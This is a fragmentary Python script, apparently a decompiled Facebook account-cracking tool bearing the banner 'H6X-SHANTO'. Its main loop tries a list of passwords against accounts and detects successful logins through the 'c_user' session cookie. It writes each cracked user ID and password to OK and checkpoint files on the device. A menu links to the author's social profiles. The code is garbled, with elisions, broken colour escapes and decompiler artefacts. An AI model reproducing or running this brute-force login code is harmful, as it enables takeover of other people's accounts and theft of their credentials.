...
def o():
    ...
    if None == '2':
        ...
        return None
    if None == '3':
        os.system('xdg-open https://github.com/JIHAD-505-DXBD')
        return None
    if None == '4':
        os.system('xdg-open https://www.facebook.com/md.jihad.hasan44')
        return None
    if None == '0':
        os.system('exit')
        return None
...
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m AUTHOR  \033[1;91m : \033[1;95mMD SHANTO
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m FACEBOOK\033[1;91m : \033[1;95S　H　A　N　T　O　ツ
\033[1;95m[\033[1;93mâœ”ï¸Ž\033[1;95m]\033[1;93m GITHUB  \033[1;91m : \033[1;95H6X-SHANTO
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;32H6X-SHANTO  ' +cid+ ' | ' +ps+          '  \033[1;33m')
                cek_apk(session,coki)
                open('/sdcard/H6X-SHANTO-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;34H6X-SHANTO  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/H6X-SHANTO-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[H6X-SHANTO] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
